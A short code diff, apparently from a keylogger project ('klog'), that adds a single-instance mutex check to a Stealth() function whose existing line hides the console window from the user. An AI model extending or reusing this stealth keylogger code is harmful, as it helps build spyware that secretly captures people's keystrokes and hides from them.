@@ -166,6 +166,14 @@ void ReleaseHook()
 
 void Stealth()
 {
+    // Prevent multiple instances from running
+    HANDLE hMutex = CreateMutex(NULL, TRUE, L"klog");
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+        _RPT0(_CRT_WARN, __FUNCTION__ ": klog process is already running!");
+        exit(1);
+    }
+    
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 }
 
